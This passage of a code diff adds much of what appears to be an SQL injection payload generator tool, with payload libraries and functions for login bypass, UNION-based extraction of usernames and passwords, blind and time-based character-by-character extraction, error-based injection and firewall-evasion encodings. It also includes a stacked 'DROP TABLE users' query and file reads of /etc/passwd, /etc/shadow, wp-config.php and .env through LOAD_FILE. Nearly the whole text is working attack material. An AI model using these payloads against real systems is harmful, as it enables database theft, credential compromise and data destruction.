+    {payload:"cn' UNION SELECT 1,variable_name,variable_value,4 FROM information_schema.global_variables WHERE variable_name='secure_file_priv'-- -", desc:"Check secure_file_priv (empty = can read/write anywhere)"},
+    {payload:"SELECT @@secure_file_priv", desc:"Direct secure_file_priv check"},
+    {payload:"SELECT super_priv FROM mysql.user WHERE user=user()", desc:"Direct super_priv check"},
+  ],
+  common_files: [
+    {payload:"/etc/passwd", desc:"Linux user accounts"},
+    {payload:"/etc/shadow", desc:"Password hashes (requires root)"},
+    {payload:"/etc/hosts", desc:"Host file"},
+    {payload:"/etc/hostname", desc:"Server hostname"},
+    {payload:"/etc/os-release", desc:"OS version info"},
+    {payload:"/proc/version", desc:"Kernel version"},
+    {payload:"/etc/apache2/apache2.conf", desc:"Apache config"},
+    {payload:"/etc/nginx/nginx.conf", desc:"Nginx config"},
+    {payload:"/etc/mysql/my.cnf", desc:"MySQL config"},
+    {payload:"/var/www/html/index.php", desc:"Web app index"},
+    {payload:"/var/www/html/config.php", desc:"Config file"},
+    {payload:"/var/www/html/wp-config.php", desc:"WordPress config — DB credentials"},
+    {payload:"/var/www/html/configuration.php", desc:"Joomla config"},
+    {payload:"/var/www/html/.env", desc:".env file — secrets"},
+    {payload:"/var/www/html/.htaccess", desc:"Apache htaccess"},
+    {payload:"/var/log/apache2/error.log", desc:"Apache error log"},
+    {payload:"/var/log/apache2/access.log", desc:"Apache access log"},
+    {payload:"C:/Windows/win.ini", desc:"Windows config file"},
+    {payload:"C:/Windows/system32/drivers/etc/hosts", desc:"Windows hosts file"},
+    {payload:"C:/xampp/apache/conf/httpd.conf", desc:"XAMPP Apache config"},
+    {payload:"C:/xampp/mysql/data/mysql/user.MYD", desc:"XAMPP MySQL user data"},
+  ],
+  waf_bypass: [
+    {payload:"-- -", desc:"MySQL double dash comment (note trailing space)", tags:[{c:"green",l:"comment"}]},
+    {payload:"#", desc:"MySQL hash comment", tags:[{c:"green",l:"comment"}]},
+    {payload:"/**/", desc:"Inline comment — substitute for whitespace", tags:[{c:"blue",l:"whitespace"}]},
+    {payload:"/*!50000UNION*/", desc:"Version-conditional comment — executes in MySQL 5.0.000+", tags:[{c:"amber",l:"obfuscation"}]},
+    {payload:"/*!32302SELECT*/", desc:"Old-version conditional comment", tags:[{c:"amber",l:"obfuscation"}]},
+    {payload:"%09", desc:"Tab character — whitespace substitute", tags:[{c:"blue",l:"whitespace"}]},
+    {payload:"%0a", desc:"Newline — whitespace substitute", tags:[{c:"blue",l:"whitespace"}]},
+    {payload:"%0b", desc:"Vertical tab — whitespace", tags:[{c:"blue",l:"whitespace"}]},
+    {payload:"%0d", desc:"Carriage return — whitespace", tags:[{c:"blue",l:"whitespace"}]},
+    {payload:"SeLeCt * FrOm users", desc:"Random case — bypasses case-sensitive WAF rules", tags:[{c:"purple",l:"case"}]},
+    {payload:"UNION/**/SELECT", desc:"Comment breaks keyword", tags:[{c:"cyan",l:"break"}]},
+    {payload:"UNION%09SELECT", desc:"Tab breaks keyword", tags:[{c:"cyan",l:"break"}]},
+    {payload:"UNION%0aSELECT", desc:"Newline breaks keyword", tags:[{c:"cyan",l:"break"}]},
+    {payload:"CONCAT('ad','min')", desc:"String concat to avoid keyword match", tags:[{c:"amber",l:"concat"}]},
+    {payload:"'ad'/*comment*/'min'", desc:"Comment-split string", tags:[{c:"amber",l:"concat"}]},
+    {payload:"CHAR(117,110,105,111,110)", desc:"CHAR() encodes UNION keyword", tags:[{c:"red",l:"encoding"}]},
+    {payload:"0x61646d696e", desc:"Hex string for 'admin'", tags:[{c:"red",l:"encoding"}]},
+    {payload:"%2527", desc:"Double URL-encoded single quote", tags:[{c:"red",l:"encoding"}]},
+    {payload:"%bf%27", desc:"Wide-byte bypass for GBK/Big5 charset", tags:[{c:"red",l:"charset"}]},
+    {payload:"' OR 1 BETWEEN 1 AND 1-- -", desc:"BETWEEN instead of = (evades = filter)", tags:[{c:"purple",l:"operator"}]},
+    {payload:"' OR '1' LIKE '1'-- -", desc:"LIKE instead of = ", tags:[{c:"purple",l:"operator"}]},
+    {payload:"' OR '1' REGEXP '^1$'-- -", desc:"REGEXP operator", tags:[{c:"purple",l:"operator"}]},
+    {payload:"' OR 1 IN (1)-- -", desc:"IN instead of =", tags:[{c:"purple",l:"operator"}]},
+    {payload:"'||'1'='1", desc:"Concat-based OR bypass", tags:[{c:"cyan",l:"alt-op"}]},
+    {payload:"'&&'1'='1", desc:"AND using &&", tags:[{c:"cyan",l:"alt-op"}]},
+  ],
+  priv: [
+    {payload:"SELECT USER()", desc:"Current MySQL user"},
+    {payload:"SELECT CURRENT_USER()", desc:"CURRENT_USER() — may differ from USER()"},
+    {payload:"SELECT user FROM mysql.user", desc:"List all DB users"},
+    {payload:"SELECT super_priv FROM mysql.user WHERE user=user()", desc:"Check SUPER privilege"},
+    {payload:"SELECT * FROM information_schema.user_privileges", desc:"All privileges for all users"},
+    {payload:"SELECT grantee,privilege_type FROM information_schema.user_privileges WHERE grantee=CONCAT('''',user(),'@localhost''')", desc:"Privileges for current user"},
+    {payload:"SHOW GRANTS FOR CURRENT_USER()", desc:"MySQL show grants"},
+    {payload:"SELECT @@version", desc:"MySQL version"},
+    {payload:"SELECT @@version_compile_os", desc:"Compiled OS — identifies server OS"},
+    {payload:"SELECT @@datadir", desc:"MySQL data directory"},
+    {payload:"SELECT @@basedir", desc:"MySQL base directory"},
+    {payload:"SELECT @@hostname", desc:"Server hostname"},
+    {payload:"SELECT @@global.secure_file_priv", desc:"secure_file_priv global setting"},
+  ],
+  reference_mysql: [
+    {cmd:"mysql -u root -h host -P 3306 -p", desc:"Connect to MySQL"},
+    {cmd:"SHOW DATABASES;", desc:"List all databases"},
+    {cmd:"USE dbname;", desc:"Switch database"},
+    {cmd:"SHOW TABLES;", desc:"List tables in current DB"},
+    {cmd:"DESCRIBE tablename;", desc:"Show table structure"},
+    {cmd:"SELECT * FROM table;", desc:"All rows"},
+    {cmd:"SELECT col1,col2 FROM table WHERE condition;", desc:"Filter rows"},
+    {cmd:"INSERT INTO table VALUES (v1,v2);", desc:"Insert row"},
+    {cmd:"UPDATE table SET col=val WHERE condition;", desc:"Update rows"},
+    {cmd:"DELETE FROM table WHERE condition;", desc:"Delete rows"},
+    {cmd:"DROP TABLE table;", desc:"Delete table permanently"},
+    {cmd:"ALTER TABLE t ADD col INT;", desc:"Add column"},
+    {cmd:"ALTER TABLE t RENAME COLUMN old TO new;", desc:"Rename column"},
+    {cmd:"ALTER TABLE t MODIFY col DATE;", desc:"Change column type"},
+    {cmd:"ALTER TABLE t DROP col;", desc:"Drop column"},
+    {cmd:"SELECT * FROM t ORDER BY col DESC;", desc:"Sort descending"},
+    {cmd:"SELECT * FROM t LIMIT 10;", desc:"First 10 rows"},
+    {cmd:"SELECT * FROM t LIMIT 5,10;", desc:"Rows 6-15 (offset 5)"},
+    {cmd:"SELECT * FROM t WHERE name LIKE 'admin%';", desc:"LIKE wildcard match"},
+  ],
+};
+
+// ═══════════════════════════════════════════════════════════
+// DISCOVERY PAYLOADS
+// ═══════════════════════════════════════════════════════════
+
+function initDiscovery() {
+  const el = document.getElementById('discovery-payloads');
+  el.innerHTML = DB.discovery.map(p => makePayloadItem(p.payload, p.desc)).join('');
+}
+
+// ═══════════════════════════════════════════════════════════
+// AUTH BYPASS
+// ═══════════════════════════════════════════════════════════
+
+function generateAuthPayloads() {
+  const field = document.getElementById('auth-field').value;
+  const ctx = document.getElementById('auth-context').value;
+  const user = document.getElementById('auth-username').value.trim() || 'admin';
+  const cm = document.getElementById('auth-comment').value;
+  const c = cm === 'dashdash' ? '-- -' : cm === 'hash' ? '#' : '/**/';
+
+  const payloads = [];
+  if (ctx === 'string') {
+    payloads.push({payload:`${user}'-- -`, desc:"Comment truncation — removes password check"});
+    payloads.push({payload:`${user}'${c}`, desc:"Variant comment style"});
+    payloads.push({payload:`${user}' OR '1'='1`, desc:"OR bypass in username"});
+    payloads.push({payload:`${user}' OR '1'='1'${c}`, desc:"OR bypass with comment"});
+    payloads.push({payload:`' OR '1'='1'${c}`, desc:"Blank username OR bypass"});
+    payloads.push({payload:`' OR 1=1${c}`, desc:"Numeric OR"});
+    payloads.push({payload:`' OR 'x'='x'${c}`, desc:"x=x variant"});
+  } else if (ctx === 'numeric') {
+    payloads.push({payload:`1 OR 1=1${c}`, desc:"Numeric OR bypass"});
+    payloads.push({payload:`1; DROP TABLE users${c}`, desc:"Stacked query (if supported)"});
+    payloads.push({payload:`-1 OR 1=1${c}`, desc:"Negative ID bypass"});
+  } else {
+    payloads.push({payload:`${user}')-- -`, desc:"Close paren + comment"});
+    payloads.push({payload:`${user}') OR ('1'='1`, desc:"Paren OR bypass"});
+    payloads.push({payload:`${user}') OR ('1'='1'${c}`, desc:"Paren OR with comment"});
+    payloads.push({payload:`') OR '1'='1'${c}`, desc:"Blank user paren OR"});
+  }
+
+  document.getElementById('auth-output').innerHTML = buildSection('Generated Auth Bypass Payloads', payloads);
+}
+
+function initAuthLib() {
+  document.getElementById('auth-all-payloads').innerHTML = DB.auth.map(p => makePayloadItem(p.payload, p.desc)).join('');
+}
+
+// ═══════════════════════════════════════════════════════════
+// UNION INJECTION
+// ═══════════════════════════════════════════════════════════
+
+let currentUnionTab = 'col-detection';
+
+function unionTab(el, name) {
+  document.querySelectorAll('#page-union-inject .tab').forEach(t => t.classList.remove('active'));
+  el.classList.add('active');
+  ['col-detection','col-visible','fingerprint','schema-enum','data-extract'].forEach(t => {
+    const d = document.getElementById('union-tab-' + t);
+    if (d) d.style.display = t === name ? 'block' : 'none';
+  });
+  currentUnionTab = name;
+  renderUnionTab(name);
+}
+
+function getUnionCfg() {
+  return {
+    prefix: document.getElementById('union-prefix').value || "'",
+    comment: document.getElementById('union-comment').value || '-- -',
+    cols: parseInt(document.getElementById('union-cols').value) || 4,
+    vis: parseInt(document.getElementById('union-visible').value) || 2,
+    db: document.getElementById('union-db').value.trim() || 'dev',
+    table: document.getElementById('union-table').value.trim() || 'credentials',
+  };
+}
+
+function makeUnionCols(cols, vis, injection) {
+  const a = [];
+  for (let i = 1; i <= cols; i++) a.push(i === vis ? injection : i.toString());
+  return a.join(',');
+}
+
+function renderUnionTab(name) {
+  const cfg = getUnionCfg();
+  if (name === 'col-detection') {
+    const orderBy = [];
+    for (let i = 1; i <= 20; i++) {
+      orderBy.push({payload:`${cfg.prefix} ORDER BY ${i}${cfg.comment}`, desc:`Test ${i} column${i>1?'s':''} — error means column count is ${i-1}`});
+    }
+    const nullArr = [];
+    for (let i = 1; i <= 10; i++) {
+      nullArr.push({payload:`${cfg.prefix} UNION SELECT ${Array(i).fill('NULL').join(',')}${cfg.comment}`, desc:`Try ${i} column${i>1?'s':''} — success means count = ${i}`});
+    }
+    document.getElementById('union-orderby-payloads').innerHTML = buildSection('ORDER BY Column Detection', orderBy);
+    document.getElementById('union-null-payloads').innerHTML = buildSection('UNION NULL Column Detection', nullArr);
+  } else if (name === 'col-visible') {
+    const payloads = [];
+    const nums = Array.from({length: cfg.cols}, (_,i) => (i+1).toString()).join(',');
+    payloads.push({payload:`${cfg.prefix} UNION SELECT ${nums}${cfg.comment}`, desc:`Inject numbers — visible on page = injection points`});
+    for (let i = 1; i <= cfg.cols; i++) {
+      const a = Array.from({length: cfg.cols}, (_,j) => j+1 === i ? "'VISIBLE'" : (j+1).toString()).join(',');
+      payloads.push({payload:`${cfg.prefix} UNION SELECT ${a}${cfg.comment}`, desc:`Test column ${i} visibility`});
+    }
+    document.getElementById('union-visible-payloads').innerHTML = buildSection('Visible Column Detection', payloads);
+  } else if (name === 'fingerprint') {
+    const payloads = [
+      {payload:`${cfg.prefix} UNION SELECT ${makeUnionCols(cfg.cols,cfg.vis,'@@version')}${cfg.comment}`, desc:"MySQL/MariaDB version"},
+      {payload:`${cfg.prefix} UNION SELECT ${makeUnionCols(cfg.cols,cfg.vis,'VERSION()')}${cfg.comment}`, desc:"Generic version()"},
+      {payload:`${cfg.prefix} UNION SELECT ${makeUnionCols(cfg.cols,cfg.vis,'user()')}${cfg.comment}`, desc:"Current DB user"},
+      {payload:`${cfg.prefix} UNION SELECT ${makeUnionCols(cfg.cols,cfg.vis,'database()')}${cfg.comment}`, desc:"Current database name"},
+      {payload:`${cfg.prefix} UNION SELECT ${makeUnionCols(cfg.cols,cfg.vis,'@@datadir')}${cfg.comment}`, desc:"MySQL data directory"},
+      {payload:`${cfg.prefix} UNION SELECT ${makeUnionCols(cfg.cols,cfg.vis,'@@version_compile_os')}${cfg.comment}`, desc:"OS platform"},
+      {payload:`${cfg.prefix} UNION SELECT ${makeUnionCols(cfg.cols,cfg.vis,'@@hostname')}${cfg.comment}`, desc:"Server hostname"},
+      {payload:`${cfg.prefix} UNION SELECT ${makeUnionCols(cfg.cols,cfg.vis,'current_user')}${cfg.comment}`, desc:"PostgreSQL current user"},
+      {payload:`${cfg.prefix} UNION SELECT ${makeUnionCols(cfg.cols,cfg.vis,'current_database()')}${cfg.comment}`, desc:"PostgreSQL current database"},
+      {payload:`${cfg.prefix} UNION SELECT ${makeUnionCols(cfg.cols,cfg.vis,'POW(1,1)')}${cfg.comment}`, desc:"MySQL numeric fingerprint (returns 1)"},
+    ];
+    document.getElementById('union-fingerprint-payloads').innerHTML = buildSection('DBMS Fingerprinting', payloads);
+  } else if (name === 'schema-enum') {
+    const payloads = [
+      {payload:`${cfg.prefix} UNION SELECT ${makeUnionCols(cfg.cols,cfg.vis,'schema_name')} FROM INFORMATION_SCHEMA.SCHEMATA${cfg.comment}`, desc:"List all databases"},
+      {payload:`${cfg.prefix} UNION SELECT ${makeUnionCols(cfg.cols,cfg.vis,'schema_name')} FROM INFORMATION_SCHEMA.SCHEMATA WHERE schema_name NOT IN ('information_schema','mysql','performance_schema','sys')${cfg.comment}`, desc:"List user databases only"},
+      {payload:`${cfg.prefix} UNION SELECT ${makeUnionCols(cfg.cols,cfg.vis,"GROUP_CONCAT(schema_name SEPARATOR ', ')")} FROM INFORMATION_SCHEMA.SCHEMATA${cfg.comment}`, desc:"All databases in one row"},
+      {payload:`${cfg.prefix} UNION SELECT ${makeUnionCols(cfg.cols,cfg.vis,'table_name')},table_schema,${Array.from({length:cfg.cols-2},(_,i)=>i+3).join(',')} FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='${cfg.db}'${cfg.comment}`, desc:`Tables in '${cfg.db}' database`},
+      {payload:`${cfg.prefix} UNION SELECT ${makeUnionCols(cfg.cols,cfg.vis,"GROUP_CONCAT(table_name SEPARATOR ', ')")} FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='${cfg.db}'${cfg.comment}`, desc:`All tables in '${cfg.db}' (single row)`},
+      {payload:`${cfg.prefix} UNION SELECT ${makeUnionCols(cfg.cols,cfg.vis,'column_name')},table_name,${Array.from({length:cfg.cols-2},(_,i)=>i+3).join(',')} FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='${cfg.table}'${cfg.comment}`, desc:`Columns in '${cfg.table}'`},
+      {payload:`${cfg.prefix} UNION SELECT ${makeUnionCols(cfg.cols,cfg.vis,"GROUP_CONCAT(column_name SEPARATOR ', ')")} FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='${cfg.table}'${cfg.comment}`, desc:`All columns in '${cfg.table}' (single row)`},
+      {payload:`${cfg.prefix} UNION SELECT ${makeUnionCols(cfg.cols,cfg.vis,"GROUP_CONCAT(table_name,': ',column_name SEPARATOR ' | ')")} FROM INFORMATION_SCHEMA.COLUMNS WHERE table_schema='${cfg.db}'${cfg.comment}`, desc:`Tables+columns in '${cfg.db}' — map whole schema`},
+    ];
+    document.getElementById('union-schema-payloads').innerHTML = buildSection('Schema Enumeration', payloads);
+  }
+}
+
+function buildExtractPayload() {
+  const cfg = getUnionCfg();
+  const cols = document.getElementById('union-extract-cols').value.trim() || 'username,password';
+  const colArr = cols.split(',').map(c => c.trim());
+  const extras = cfg.cols - colArr.length;
+  const selectParts = [];
+  for (let i = 1; i <= cfg.cols; i++) {
+    if (i <= colArr.length) selectParts.push(colArr[i-1]);
+    else selectParts.push(i.toString());
+  }
+  const payload = `${cfg.prefix} UNION SELECT ${selectParts.join(',')} FROM ${cfg.db ? cfg.db+'.' : ''}${cfg.table}${cfg.comment}`;
+  const concatPayload = `${cfg.prefix} UNION SELECT ${makeUnionCols(cfg.cols, cfg.vis, `GROUP_CONCAT(${colArr.join(",':',")} SEPARATOR ' | ')`)} FROM ${cfg.db ? cfg.db+'.' : ''}${cfg.table}${cfg.comment}`;
+
+  document.getElementById('union-extract-output').innerHTML = buildSection('Data Extraction Payloads', [
+    {payload, desc:`Extract ${cols} from ${cfg.db}.${cfg.table}`},
+    {payload:concatPayload, desc:`Concatenate all values in one row`},
+    {payload:`${cfg.prefix} UNION SELECT ${makeUnionCols(cfg.cols, cfg.vis, `GROUP_CONCAT(${colArr.join(",':', ")} SEPARATOR '<br>')`)} FROM ${cfg.db ? cfg.db+'.' : ''}${cfg.table} LIMIT 50${cfg.comment}`, desc:"Extract up to 50 rows"},
+  ]);
+}
+
+// ═══════════════════════════════════════════════════════════
+// BLIND INJECTION
+// ═══════════════════════════════════════════════════════════
+
+let currentBlindTab = 'boolean';
+
+function blindTab(el, name) {
+  document.querySelectorAll('#page-blind-inject .tab').forEach(t => t.classList.remove('active'));
+  el.classList.add('active');
+  ['boolean','time','extractor'].forEach(t => {
+    const d = document.getElementById('blind-tab-' + t);
+    if (d) d.style.display = t === name ? 'block' : 'none';
+  });
+  currentBlindTab = name;
+}
+
+function generateBoolPayloads() {
+  const p = document.getElementById('bool-prefix').value || "'";
+  const c = document.getElementById('bool-comment').value || '-- -';
+  const field = document.getElementById('bool-field').value.trim() || 'username';
+  const table = document.getElementById('bool-table').value.trim() || 'users';
+
+  const payloads = [
+    {payload:`${p} AND 1=1${c}`, desc:"True condition — baseline"},
+    {payload:`${p} AND 1=2${c}`, desc:"False condition — page should differ"},
+    {payload:`${p} AND (SELECT COUNT(*) FROM ${table})>0${c}`, desc:`Table '${table}' has rows`},
+    {payload:`${p} AND (SELECT COUNT(*) FROM ${table})=1${c}`, desc:`Exactly 1 row in '${table}'`},
+    {payload:`${p} AND LENGTH((SELECT ${field} FROM ${table} LIMIT 0,1))>0${c}`, desc:`First ${field} has length > 0`},
+    {payload:`${p} AND LENGTH((SELECT ${field} FROM ${table} LIMIT 0,1))>5${c}`, desc:`First ${field} length > 5`},
+    {payload:`${p} AND SUBSTRING((SELECT ${field} FROM ${table} LIMIT 0,1),1,1)='a'${c}`, desc:`First char of ${field} = 'a'`},
+    {payload:`${p} AND ASCII(SUBSTRING((SELECT ${field} FROM ${table} LIMIT 0,1),1,1))>96${c}`, desc:`ASCII first char > 96 (lowercase)`},
+    {payload:`${p} AND ASCII(SUBSTRING((SELECT ${field} FROM ${table} LIMIT 0,1),1,1))<123${c}`, desc:`ASCII < 123 (narrow to a-z)`},
+    {payload:`${p} AND ASCII(SUBSTRING((SELECT ${field} FROM ${table} LIMIT 0,1),1,1))=97${c}`, desc:`Exact match ASCII 97 = 'a'`},
+    {payload:`${p} AND (SELECT ${field} FROM ${table} LIMIT 0,1)='admin'${c}`, desc:`${field} is exactly 'admin'`},
+    {payload:`${p} AND IF((SELECT ${field} FROM ${table} LIMIT 0,1)='admin',1,0)${c}`, desc:"IF conditional test"},
+  ];
+  document.getElementById('bool-output').innerHTML = buildSection(`Boolean Payloads — ${table}.${field}`, payloads);
+}
+
+function initBoolLib() {
+  document.getElementById('bool-lib').innerHTML = DB.bool.map(p => makePayloadItem(p.payload, p.desc)).join('');
+}
+
+function generateTimePayloads() {
+  const dbms = document.getElementById('time-dbms').value;
+  const sleep = document.getElementById('time-sleep').value || 5;
+  const p = document.getElementById('time-prefix').value || "'";
+  const c = document.getElementById('time-comment').value || '-- -';
+
+  let payloads = [];
+  if (dbms === 'mysql') {
+    payloads = [
+      {payload:`${p} AND SLEEP(${sleep})${c}`, desc:`Simple sleep — delays ${sleep}s if injectable`},
+      {payload:`${p} OR SLEEP(${sleep})${c}`, desc:"OR-based sleep"},
+      {payload:`${p} AND IF(1=1,SLEEP(${sleep}),0)${c}`, desc:"Conditional sleep — true"},
+      {payload:`${p} AND IF(1=2,SLEEP(${sleep}),0)${c}`, desc:"Conditional sleep — false (no delay)"},
+      {payload:`${p} AND IF(SUBSTRING(database(),1,1)='a',SLEEP(${sleep}),0)${c}`, desc:"Sleep if DB starts with 'a'"},
+      {payload:`${p} AND IF(ASCII(SUBSTRING(database(),1,1))>109,SLEEP(${sleep}),0)${c}`, desc:"Binary search on DB name — upper half"},
+      {payload:`${p} AND IF((SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())>2,SLEEP(${sleep}),0)${c}`, desc:"Sleep if DB has > 2 tables"},
+    ];
+  } else if (dbms === 'pgsql') {
+    payloads = DB.time_pgsql.map(p => ({...p, payload: p.payload.replace('5', sleep)}));
+  } else if (dbms === 'mssql') {
+    const d = String(sleep).padStart(2,'0');
+    payloads = [
+      {payload:`${p}; WAITFOR DELAY '00:00:${d}'${c}`, desc:`MSSQL stacked sleep ${sleep}s`},
+      {payload:`${p} AND WAITFOR DELAY '00:00:${d}'${c}`, desc:"AND-based"},
+      {payload:`${p} IF(1=1) WAITFOR DELAY '00:00:${d}'${c}`, desc:"IF conditional"},
+    ];
+  } else {
+    payloads = DB.time_oracle.map(p => ({...p}));
+  }
+  document.getElementById('time-output').innerHTML = buildSection(`Time-Based Payloads (${dbms.toUpperCase()}, ${sleep}s)`, payloads);
+}
+
+function generateExtractPayloads() {
+  const q = document.getElementById('ext-query').value.trim() || 'SELECT password FROM users LIMIT 0,1';
+  const method = document.getElementById('ext-method').value;
+  const p = document.getElementById('ext-prefix').value || "'";
+  const c = document.getElementById('ext-comment').value || '-- -';
+  const len = parseInt(document.getElementById('ext-len').value) || 8;
+
+  const payloads = [];
+  for (let i = 1; i <= len; i++) {
+    if (method === 'boolean') {
+      payloads.push({payload:`${p} AND ASCII(SUBSTRING((${q}),${i},1))>64${c}`, desc:`Char ${i}: ASCII > 64 (after @)`});
+      payloads.push({payload:`${p} AND ASCII(SUBSTRING((${q}),${i},1))>96${c}`, desc:`Char ${i}: ASCII > 96 (lowercase start)`});
+      payloads.push({payload:`${p} AND ASCII(SUBSTRING((${q}),${i},1))<123${c}`, desc:`Char ${i}: ASCII < 123`});
+    } else if (method === 'time-mysql') {
+      payloads.push({payload:`${p} AND IF(ASCII(SUBSTRING((${q}),${i},1))>96,SLEEP(5),0)${c}`, desc:`Char ${i}: sleep if > 'a' ASCII`});
+      payloads.push({payload:`${p} AND IF(ASCII(SUBSTRING((${q}),${i},1))=97,SLEEP(5),0)${c}`, desc:`Char ${i}: sleep if = 'a'`});
+    } else if (method === 'time-pgsql') {
+      payloads.push({payload:`${p} AND (SELECT CASE WHEN (ASCII(SUBSTRING((${q}),${i},1))>96) THEN pg_sleep(5) ELSE pg_sleep(0) END)${c}`, desc:`Char ${i}: pg_sleep conditional`});
+    } else {
+      payloads.push({payload:`${p} IF(ASCII(SUBSTRING((${q}),${i},1))>96) WAITFOR DELAY '00:00:05'${c}`, desc:`Char ${i}: MSSQL conditional`});
+    }
+  }
+  document.getElementById('ext-output').innerHTML = buildSection(`Character Extraction Payloads (first ${len} chars)`, payloads);
+}
+
+// ═══════════════════════════════════════════════════════════
+// ERROR BASED
+// ═══════════════════════════════════════════════════════════
+
+function generateErrorPayloads() {
+  const dbms = document.getElementById('err-dbms').value;
+  const expr = document.getElementById('err-expr').value.trim() || 'version()';
+  const p = document.getElementById('err-prefix').value || "'";
+  const c = document.getElementById('err-comment').value || '-- -';
+
+  let payloads = [];
+  if (dbms === 'mysql') {
+    payloads = [
+      {payload:`${p} AND EXTRACTVALUE(1,CONCAT(0x7e,(${expr}),0x7e))${c}`, desc:`EXTRACTVALUE — ${expr}`},
+      {payload:`${p} AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT ${expr}),0x7e))${c}`, desc:`EXTRACTVALUE with SELECT`},
+    ];
+  } else if (dbms === 'mysql2') {
+    payloads = [
+      {payload:`${p} AND UPDATEXML(1,CONCAT(0x7e,(${expr}),0x7e),1)${c}`, desc:`UPDATEXML — ${expr}`},
+      {payload:`${p} AND UPDATEXML(1,CONCAT(0x7e,(SELECT ${expr}),0x7e),1)${c}`, desc:`UPDATEXML with SELECT`},
+    ];
+  } else if (dbms === 'pgsql') {
+    payloads = [
+      {payload:`${p} AND 1=CAST((SELECT ${expr}) AS INT)${c}`, desc:`CAST error — ${expr}`},
+    ];
+  } else {
+    payloads = [
+      {payload:`${p} AND 1=CONVERT(INT,(SELECT ${expr}))${c}`, desc:`CONVERT error — ${expr}`},
+    ];
+  }
+  document.getElementById('err-output').innerHTML = buildSection('Generated Error Payloads', payloads);
+}
+
+function initErrLib() {
+  const all = [...DB.error_mysql, ...DB.error_pgsql, ...DB.error_mssql];
+  document.getElementById('err-lib').innerHTML = all.map(p => makePayloadItem(p.payload, p.desc)).join('');
+}
+
+// ═══════════════════════════════════════════════════════════
+// ENUM QUERY BUILDER
+// ═══════════════════════════════════════════════════════════
+
+function buildAllEnumQueries() {
+  const prefix = document.getElementById('qb-prefix').value.trim() || "cn'";
+  const comment = document.getElementById('qb-comment').value || '-- -';
+  const cols = parseInt(document.getElementById('qb-cols').value) || 4;
+  const vis = parseInt(document.getElementById('qb-visible').value) || 2;
+  const db = document.getElementById('qb-db').value.trim() || 'dev';
+  const table = document.getElementById('qb-table').value.trim() || 'credentials';
+
+  const mk = (inj) => `${prefix} UNION SELECT ${makeUnionCols(cols, vis, inj)}${comment}`;
+
+  const sections = [
+    {title:'Current Context', payloads:[
+      {payload:mk('database()'), desc:"Current database"},
+      {payload:mk('user()'), desc:"Current DB user"},
+      {payload:mk('@@version'), desc:"MySQL version"},
+      {payload:mk('@@hostname'), desc:"Hostname"},
+      {payload:mk('@@datadir'), desc:"Data directory"},
+    ]},
+    {title:'Enumerate Databases', payloads:[
+      {payload:mk('schema_name')+` FROM INFORMATION_SCHEMA.SCHEMATA${comment}`, desc:"All databases"},
+      {payload:mk("GROUP_CONCAT(schema_name SEPARATOR ', ')")+` FROM INFORMATION_SCHEMA.SCHEMATA${comment}`, desc:"All DBs in one cell"},
+    ]},
+    {title:`Tables in '${db}'`, payloads:[
+      {payload:`${prefix} UNION SELECT ${makeUnionCols(cols,vis,'table_name')} FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='${db}'${comment}`, desc:"All tables"},
+      {payload:`${prefix} UNION SELECT ${makeUnionCols(cols,vis,"GROUP_CONCAT(table_name SEPARATOR ', ')")} FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='${db}'${comment}`, desc:"All tables (single row)"},
+    ]},
+    {title:`Columns in '${table}'`, payloads:[
+      {payload:`${prefix} UNION SELECT ${makeUnionCols(cols,vis,'column_name')} FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='${table}'${comment}`, desc:"All columns"},
+      {payload:`${prefix} UNION SELECT ${makeUnionCols(cols,vis,"GROUP_CONCAT(column_name SEPARATOR ', ')")} FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='${table}'${comment}`, desc:"All columns (single row)"},
+      {payload:`${prefix} UNION SELECT ${makeUnionCols(cols,vis,"CONCAT(column_name,' [',data_type,']')")} FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='${table}'${comment}`, desc:"Columns with data types"},
+    ]},
+    {title:'Privileges', payloads:[
+      {payload:`${prefix} UNION SELECT ${makeUnionCols(cols,vis,'super_priv')} FROM mysql.user WHERE user=user()${comment}`, desc:"SUPER privilege (Y/N)"},
+      {payload:`${prefix} UNION SELECT ${makeUnionCols(cols,vis,'variable_value')} FROM information_schema.global_variables WHERE variable_name='secure_file_priv'${comment}`, desc:"secure_file_priv value"},
+      {payload:`${prefix} UNION SELECT ${makeUnionCols(cols,vis,'grantee')},privilege_type FROM information_schema.user_privileges${comment}`, desc:"All user privileges"},
+    ]},
+    {title:'File Operations', payloads:[
+      {payload:`${prefix} UNION SELECT ${makeUnionCols(cols,vis,"LOAD_FILE('/etc/passwd')")}${comment}`, desc:"Read /etc/passwd"},
+      {payload:`${prefix} UNION SELECT ${makeUnionCols(cols,vis,"LOAD_FILE('/var/www/html/config.php')")}${comment}`, desc:"Read web config"},
+    ]},
+  ];
+
+  let html = '';
+  sections.forEach(s => { html += buildSection(s.title, s.payloads); });
+  document.getElementById('qb-output').innerHTML = html;
+}
+
+// ═══════════════════════════════════════════════════════════
+// FILE OPS
+// ═══════════════════════════════════════════════════════════
+
+let currentFileTab = 'check';
+
+function fileTab(el, name) {
+  document.querySelectorAll('#page-file-ops .tab').forEach(t => t.classList.remove('active'));
+  el.classList.add('active');
+  ['check','read','write','webshell'].forEach(t => {
+    const d = document.getElementById('file-tab-' + t);
+    if (d) d.style.display = t === name ? 'block' : 'none';
+  });
+}
+
+function initFileCheck() {
+  document.getElementById('file-check-payloads').innerHTML = buildSection('Privilege Checks', DB.file_check);
+}
+
+function initCommonFiles() {
+  document.getElementById('common-files-list').innerHTML = DB.common_files.map(p => makePayloadItem(p.payload, p.desc)).join('');
+}
+
+function generateFileRead() {
+  const path = document.getElementById('file-read-path').value.trim() || '/etc/passwd';
+  const ctx = document.getElementById('file-read-ctx').value;
+  const cols = parseInt(document.getElementById('file-union-cols').value) || 4;
+  const vis = parseInt(document.getElementById('file-union-vis').value) || 2;
+  const payloads = [];
+  if (ctx === 'union') {
+    payloads.push({payload:`cn' UNION SELECT ${makeUnionCols(cols, vis, `LOAD_FILE('${path}')`)}-- -`, desc:`Read ${path} via UNION`});
